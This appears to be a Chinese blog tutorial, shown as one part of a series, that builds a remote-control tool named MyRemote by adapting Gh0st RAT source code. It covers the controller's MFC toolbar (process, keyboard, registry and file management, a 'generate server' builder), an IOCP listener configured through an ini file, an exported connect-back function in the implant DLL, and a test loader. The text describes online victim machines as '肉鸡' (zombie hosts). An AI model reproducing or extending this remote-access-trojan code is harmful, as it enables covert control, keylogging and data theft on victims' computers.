<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//添加功能图标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::Add_ToolBar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此处添加实现代码.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//创造并加载工具栏</span></span><br><span class="line">	<span class="keyword">if</span> (!m_ToolBar.CreateEx(<span class="keyword">this</span>, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP</span><br><span class="line">		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||</span><br><span class="line">		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))</span><br><span class="line">	&#123;</span><br><span class="line">		TRACE0(<span class="string">&quot;Failed to create toolbar\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;      <span class="comment">// fail to create</span></span><br><span class="line">	&#125;</span><br><span class="line">	m_ToolBar.ModifyStyle(<span class="number">0</span>, TBSTYLE_FLAT);    <span class="comment">//Fix for WinXP</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//TrueColorToolBar.h提供的函数，用来分割BITMAP，并上色，否则就根本没有显示</span></span><br><span class="line">	m_ToolBar.LoadTrueColorToolBar</span><br><span class="line">	(</span><br><span class="line">		<span class="number">48</span>,    <span class="comment">//加载真彩工具条</span></span><br><span class="line">		IDB_BITMAP_MAIN,</span><br><span class="line">		IDB_BITMAP_MAIN,</span><br><span class="line">		IDB_BITMAP_MAIN</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化工具栏位置</span></span><br><span class="line">	RECT rt, rtMain;</span><br><span class="line">	GetWindowRect(&amp;rtMain);</span><br><span class="line">	rt.left = <span class="number">0</span>;</span><br><span class="line">	rt.top = <span class="number">0</span>;</span><br><span class="line">	rt.bottom = <span class="number">80</span>;</span><br><span class="line">	rt.right = rtMain.right - rtMain.left +<span class="number">200</span>;</span><br><span class="line">	m_ToolBar.MoveWindow(&amp;rt, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//给工具栏下面附加文字</span></span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">0</span>, <span class="string">&quot;终端管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">1</span>, <span class="string">&quot;进程管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">2</span>, <span class="string">&quot;窗口管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">3</span>, <span class="string">&quot;桌面管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">4</span>, <span class="string">&quot;文件管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">5</span>, <span class="string">&quot;语音管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">6</span>, <span class="string">&quot;键盘管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">7</span>, <span class="string">&quot;服务管理&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">8</span>, <span class="string">&quot;注册表管理&quot;</span>);</span><br><span class="line">	<span class="comment">//中间空一格</span></span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">10</span>, <span class="string">&quot;参数设置&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">11</span>, <span class="string">&quot;生成服务端&quot;</span>);</span><br><span class="line">	m_ToolBar.SetButtonText(<span class="number">12</span>, <span class="string">&quot;帮助&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//显示工具栏</span></span><br><span class="line">	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然同样需要在Onsize设置大小化处理，然后还需要解决有最小化程序崩溃的问题。</p>
<p>后面就是功能问题了，工具栏是没有消息处理的，但是我们可以将其ID改为其对应的菜单栏消息处理ID，就可以完成点击一样有消息处理效果了。一个一个设置就完事了。</p>
<p>阶段成品展示<br><img src="https://s2.loli.net/2022/04/10/NKBLEAdXxaJCzPS.png"></p>
<h3 id="添加系统托盘"><a href="#添加系统托盘" class="headerlink" title="添加系统托盘"></a>添加系统托盘</h3><p>系统托盘，就是出现在我们电脑下面右边的那些图标，点击有效果。</p>
<p>需要用到一个函数<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shell_notifyicona">Shell_NotifyIcon</a></p>
<pre><code>//将消息发送到任务栏的状态区域。
BOOL Shell_NotifyIconA(
  [in] DWORD            dwMessage,  //一个值，该值指定此函数要执行的操作。
  [in] PNOTIFYICONDATAA lpData    //指向 NOTIFYICONDATA 结构的指针。
);</code></pre>
<p>然后在看看PNOTIFYICONDATAA结构体。</p>
<pre><code>//包含系统在通知区域中显示通知所需的信息。
typedef struct _NOTIFYICONDATAA &#123;
  DWORD cbSize;    //此结构的大小（以字节为单位）。
  HWND  hWnd;        //接收与通知区域中的图标关联的通知的窗口的句柄。            //任务栏图标的应用程序定义的标识符。
  UINT  uID;        //任务栏图标的应用程序定义的标识符。的标志
  UINT  uFlags;        //指示结构的其他成员中哪些包含有效数据的标志
  UINT  uCallbackMessage;        ////托盘事件的消息响应函数
  HICON hIcon;        //要添加、修改或删除的图标的句柄。
#if ...
  CHAR  szTip[64];    //标准工具提示的文本
#else
  CHAR  szTip[128];
#endif
  DWORD dwState;        //图标的状态。
  DWORD dwStateMask;    //
  CHAR  szInfo[256];
  union &#123;
    UINT uTimeout;
    UINT uVersion;
  &#125; DUMMYUNIONNAME;
  CHAR  szInfoTitle[64];    //气球通知的标题
  DWORD dwInfoFlags;
  GUID  guidItem;
  HICON hBalloonIcon;
&#125; NOTIFYICONDATAA, *PNOTIFYICONDATAA;</code></pre>
<p>我们照样单独新建一个函数去实现这个功能。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 添加系统托盘</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::Add_System_Tray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此处添加实现代码.</span></span><br><span class="line">	NotifIconDate.cbSize = <span class="keyword">sizeof</span>(NOTIFYICONDATA);</span><br><span class="line">	NotifIconDate.hWnd = <span class="keyword">this</span>-&gt;m_hWnd;</span><br><span class="line">	NotifIconDate.uID = IDR_MAINFRAME;     <span class="comment">//图标的ID，就用程序原本的那个</span></span><br><span class="line">	NotifIconDate.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   <span class="comment">//托盘所拥有的状态，消息窗口，图标，气泡都有效</span></span><br><span class="line">	NotifIconDate.uCallbackMessage = UM_ICONNOTIFY;            <span class="comment">//回调消息，需要自己设置，用来处理一些系统托盘的一些消息</span></span><br><span class="line">	NotifIconDate.hIcon = m_hIcon;                            <span class="comment">//icon 变量，在项目生成时已经有了</span></span><br><span class="line">	CString str = <span class="string">&quot;MyRemote远程协助软件&quot;</span>;       <span class="comment">//气泡提示字符串</span></span><br><span class="line">	lstrcpyn(NotifIconDate.szTip, (LPCSTR)str, <span class="keyword">sizeof</span>(NotifIconDate.szTip) / <span class="keyword">sizeof</span>(NotifIconDate.szTip[<span class="number">0</span>]));</span><br><span class="line">	Shell_NotifyIcon(NIM_ADD, &amp;NotifIconDate);   <span class="comment">//显示托盘</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>气泡有了，图标也加载好了，就只剩回调消息函数了，我们需要自己定义一个，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/rainbow70626/p/8034910.html#:~:text=%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B6%88%E6%81%AF%E6%93%8D%E4%BD%9C%E5%A6%82%E4%B8%8B%EF%BC%9A.%201.%20%E5%BB%BA%E7%AB%8BMFC%E5%B7%A5%E7%A8%8B%EF%BC%8C%E5%A6%82%E5%9F%BA%E4%BA%8E%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8CTest%E3%80%82.%202.%20%E5%9C%A8%E8%B5%84%E6%BA%90%E4%B8%AD%E6%B7%BB%E5%8A%A0%E8%A6%81%E5%A4%84%E7%90%86%E7%9A%84%E6%B6%88%E6%81%AF%E7%9A%84%E5%80%BC%EF%BC%8C%E5%8D%B3%E5%9C%A8CTestDlg.h%E4%B8%AD%E6%B7%BB%E5%8A%A0%20%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81%E3%80%82.,%28%E5%9B%A0%E4%B8%BA%E5%BE%88%E5%A4%9AMFC%E7%9A%84%E6%B6%88%E6%81%AF%E6%98%AF%E5%9C%A8WM_USER%E5%86%85%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E7%94%A8%E6%AF%94WM_USER%E5%A4%A7%E7%9A%84%E6%B6%88%E6%81%AF%29%20%23define%20WM_MyMessage%20%28WM_USER%2B100%29%203.%20%E5%A3%B0%E6%98%8E%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8CTestDlg.h%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81%EF%BC%9A.">MFC自定义消息</a></p>
<p>照着网站中的操作做就行。</p>
<p>最后是解决一个窗口关闭，托盘图标仍然存在的情况。解决办法，给主窗口添加一个WM_CLOSE的消息处理即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//主窗口退出时，系统托盘图标消失</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::OnClose</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">	Shell_NotifyIcon(NIM_DELETE, &amp;NotifIconDate);   <span class="comment">//显示托盘</span></span><br><span class="line">	CDialogEx::OnClose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h3><p>主要是我自己想添加一些背景图片。</p>
<h2 id="part3-Socket服务端数据传输内核"><a href="#part3-Socket服务端数据传输内核" class="headerlink" title="part3-Socket服务端数据传输内核"></a>part3-Socket服务端数据传输内核</h2><h3 id="直接套用其相关的类"><a href="#直接套用其相关的类" class="headerlink" title="直接套用其相关的类"></a>直接套用其相关的类</h3><p>复制，然后修改到不报错就行，过程还是比较多，慢慢弄。</p>
<h3 id="Gh0st的Socket数据传输代码分析"><a href="#Gh0st的Socket数据传输代码分析" class="headerlink" title="Gh0st的Socket数据传输代码分析"></a>Gh0st的Socket数据传输代码分析</h3><p>数据传输用到的类就是CIOCPServer，里面有Socket的绑定，和所有从客户端传来的消息的处理函数。</p>
<p>通过后面的功能来学习数据传输。</p>
<h3 id="利用G0hst的代码绑定并监听指定端口"><a href="#利用G0hst的代码绑定并监听指定端口" class="headerlink" title="利用G0hst的代码绑定并监听指定端口"></a>利用G0hst的代码绑定并监听指定端口</h3><p>MyRemoteDlg.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//NotifyProc是这个socket内核的核心  所有的关于socket 的处理都要调用这个函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">CMyRemoteDlg::NotifyProc</span><span class="params">(LPVOID lpParam, ClientContext* pContext, UINT nCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">switch</span> (nCode)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> NC_CLIENT_CONNECT:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> NC_CLIENT_DISCONNECT:</span><br><span class="line">			<span class="comment">//g_pCcRemoteDlg-&gt;PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);	// 当服务端断开或出错响应</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> NC_TRANSMIT:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> NC_RECEIVE:</span><br><span class="line">			<span class="comment">//ProcessReceive(pContext);        // 这里是有数据到来 但没有完全接收</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> NC_RECEIVE_COMPLETE:</span><br><span class="line">			<span class="comment">//ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (...) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//                             监听端口    最大上线个数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::Activate</span><span class="params">(UINT nPort, UINT nMaxConnections)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CString		str;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (m_iocpServer != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		m_iocpServer-&gt;Shutdown();</span><br><span class="line">		<span class="keyword">delete</span> m_iocpServer;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	m_iocpServer = <span class="keyword">new</span> CIOCPServer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 开启IPCP服务器 最大连接  端口     查看NotifyProc回调函数  函数定义</span></span><br><span class="line">	<span class="keyword">if</span> (m_iocpServer-&gt;Initialize((NOTIFYPROC)NotifyProc, <span class="literal">NULL</span>, <span class="number">100000</span>, nPort))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> hostname[<span class="number">256</span>];</span><br><span class="line">		gethostname(hostname, <span class="keyword">sizeof</span>(hostname));</span><br><span class="line">		HOSTENT* host = gethostbyname(hostname);</span><br><span class="line">		<span class="keyword">if</span> (host != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; ; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				str += inet_ntoa(*(IN_ADDR*)host-&gt;h_addr_list[i]);</span><br><span class="line">				<span class="keyword">if</span> (host-&gt;h_addr_list[i] + host-&gt;h_length &gt;= host-&gt;h_name)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				str += <span class="string">&quot;/&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		str.Format(<span class="string">&quot;监听端口: %d成功&quot;</span>, nPort);</span><br><span class="line">		Add_Log_Message(<span class="literal">true</span>, str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		str.Format(<span class="string">&quot;监听端口: %d失败&quot;</span>, nPort);</span><br><span class="line">		Add_Log_Message(<span class="literal">true</span>, str);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MyRemoteDlg.h</p>
<pre><code>protected:
    static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
    void Activate(UINT nPort, UINT nMaxConnections);</code></pre>
<p>注意添加上#include “include/IOCPServer.h”头文件，因为具体的实现是调用了这个类的成员函数。</p>
<h3 id="添加ini配置文件"><a href="#添加ini配置文件" class="headerlink" title="添加ini配置文件"></a>添加ini配置文件</h3><p>为了方便修改端口等信息，我们采用读取ini配置文件的方式来完成这件事。并且我们会添加一个对话框来实现值的设定。</p>
<p>同样我们使用了G0hst中一个写好的类，InFile.cpp中的CIniFile类。其本质是通过构造函数创建了一个ini配置文件，然后是利用GetPrivateProfileInt，GetPrivateProfileString，WritePrivateProfileString等API函数操作ini文件，或者读取ini文件中的一些内容。</p>
<p>前面的小结已经创建了Activate函数，所以我们只需要提取ini文件里面的值然后作为参数即可，但是我们为了能够直接在程序中修改端口port，所以就新建了一个对话框，所以为了使所有的对话框能够使用CIniFile变量，我们将其定义在MyRemote.h。</p>
<p>然后添加ListenPort函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 根据ini文件添加监听端口</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::ListenPort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此处添加实现代码.</span></span><br><span class="line">	<span class="keyword">int</span>	nPort = ((CMyRemoteApp*)AfxGetApp())-&gt;m_IniFile.GetInt(<span class="string">&quot;Settings&quot;</span>, <span class="string">&quot;ListenPort&quot;</span>);         <span class="comment">//读取ini 文件中的监听端口</span></span><br><span class="line">	<span class="keyword">int</span>	nMaxConnection = ((CMyRemoteApp*)AfxGetApp())-&gt;m_IniFile.GetInt(<span class="string">&quot;Settings&quot;</span>, <span class="string">&quot;MaxConnection&quot;</span>);   <span class="comment">//读取最大连接数</span></span><br><span class="line">	<span class="keyword">if</span> (nPort == <span class="number">0</span>)</span><br><span class="line">		nPort = <span class="number">80</span>;</span><br><span class="line">	<span class="keyword">if</span> (nMaxConnection == <span class="number">0</span>)</span><br><span class="line">		nMaxConnection = <span class="number">10000</span>;</span><br><span class="line">	Activate(nPort, nMaxConnection);             <span class="comment">//开始监听</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对话框的实现，添加一个对话框资源，然后添加上两个Edit控件，让我们可以输入port和max。然后给确定按钮添加一个Onclick事件处理函数，修改ini文件。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CSettingDlg::OnBnClickedOk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	UpdateData(TRUE);</span><br><span class="line">	((CMyRemoteApp*)AfxGetApp())-&gt;m_IniFile.SetInt(<span class="string">&quot;Settings&quot;</span>, <span class="string">&quot;ListenPort&quot;</span>, m_nListernProt);      <span class="comment">//向ini文件中写入值</span></span><br><span class="line">	((CMyRemoteApp*)AfxGetApp())-&gt;m_IniFile.SetInt(<span class="string">&quot;Settings&quot;</span>, <span class="string">&quot;MaxConnection&quot;</span>, m_nMax_Connect);</span><br><span class="line">	MessageBox(<span class="string">&quot;设置成功，重启本程序后生效！&quot;</span>);</span><br><span class="line">	CDialogEx::OnOK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="part4-socket客户端的数据传输过程"><a href="#part4-socket客户端的数据传输过程" class="headerlink" title="part4-socket客户端的数据传输过程"></a>part4-socket客户端的数据传输过程</h2><h3 id="套用Gh0st源码编译dll文件"><a href="#套用Gh0st源码编译dll文件" class="headerlink" title="套用Gh0st源码编译dll文件"></a>套用Gh0st源码编译dll文件</h3><p>过程较多，慢慢调试。</p>
<h3 id="同样理解Gh0st的socket内核"><a href="#同样理解Gh0st的socket内核" class="headerlink" title="同样理解Gh0st的socket内核"></a>同样理解Gh0st的socket内核</h3><p>我们加载了很多Gh0st的类，用于通信实际上就是ClienSocket类，其他部分类都是一个类对应一个功能，并且设置了相应的接收消息函数。</p>
<p>通过后面的功能来学习数据传输。</p>
<h3 id="添加一个导出函数作为Client的连接函数"><a href="#添加一个导出函数作为Client的连接函数" class="headerlink" title="添加一个导出函数作为Client的连接函数"></a>添加一个导出函数作为Client的连接函数</h3><p>添加一个TestRun的导出函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">TestRun</span><span class="params">(<span class="keyword">char</span>* strHost, <span class="keyword">int</span> nPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">strcpy</span>(g_strHost, strHost);   <span class="comment">// 保存上线地址</span></span><br><span class="line">	g_dwPort = nPort;             <span class="comment">// 保存上线端口</span></span><br><span class="line">	HANDLE hThread = MyCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//这里等待线程结束</span></span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本质是调用dllmain中的main函数。</p>
<h3 id="编写一个exe使用dll文件的导出函数"><a href="#编写一个exe使用dll文件的导出函数" class="headerlink" title="编写一个exe使用dll文件的导出函数"></a>编写一个exe使用dll文件的导出函数</h3><p>看看导出函数可不可用，并调试dll文件，在dll的属性中设置目标exe的路径即可调试dll。</p>
<p>使用LoadLibrary，和GetProcAddress来得到导出函数地址，然后调用测试是否能够上线。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> strHost[] = <span class="string">&quot;127.0.0.1&quot;</span>;          <span class="comment">//声明上线地址</span></span><br><span class="line">	<span class="keyword">int</span>  nPort = <span class="number">7000</span>;                     <span class="comment">//声明上线端口</span></span><br><span class="line">	<span class="comment">//载入服务端dll</span></span><br><span class="line">	HMODULE hServerDll = LoadLibrary(<span class="string">&quot;..\\..\\bin\\server\\MainDll.dll&quot;</span>);</span><br><span class="line">	<span class="comment">//声明导出函数类型--查看上一节导出的TestRun函数</span></span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_cdecl* TestRunT)</span><span class="params">(<span class="keyword">char</span>* strHost, <span class="keyword">int</span> nPort)</span></span>;</span><br><span class="line">	<span class="comment">//寻找dll中导出函数</span></span><br><span class="line">	TestRunT pTestRunT = (TestRunT)GetProcAddress(hServerDll, <span class="string">&quot;TestRun&quot;</span>);</span><br><span class="line">	<span class="comment">//判断函数是否为空</span></span><br><span class="line">	<span class="keyword">if</span> (pTestRunT != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pTestRunT(strHost, nPort);   <span class="comment">//调用这个函数</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="服务端添加上线信息"><a href="#服务端添加上线信息" class="headerlink" title="服务端添加上线信息"></a>服务端添加上线信息</h3><p>之前都只是测试了下能不能向列添加信息，这次是真的添加上线机的相关信息。</p>
<p>传输过程</p>
<ul>
<li>客户端dll文件的main函数，定义了CClientSocket的一个变量后，调用connect函数。</li>
<li>后面有一个sendLoginInfo()函数，这个函数定义了一个LOGININFO结构体变量，然后对其调用相关函数附值，然后send发送给控制服务端，其中包含了TOKEN_LOGIN这个消息。</li>
<li>控制服务端的NotifyProc函数接收到消息后，case判断到TOKEN_LOGIN，判断上线机器个数未达到最大，然后向控制端的主对话框发送WM_ADDTOLIST消息，调用自定义的WM_ADDTOLIST处理函数OnOnlineAddToList。</li>
<li>OnOnlineAddToList()函数，会将传入控制服务端的消息，也就肉鸡的机器信息经过一些处理后，添加到上线列表控件中。</li>
</ul>
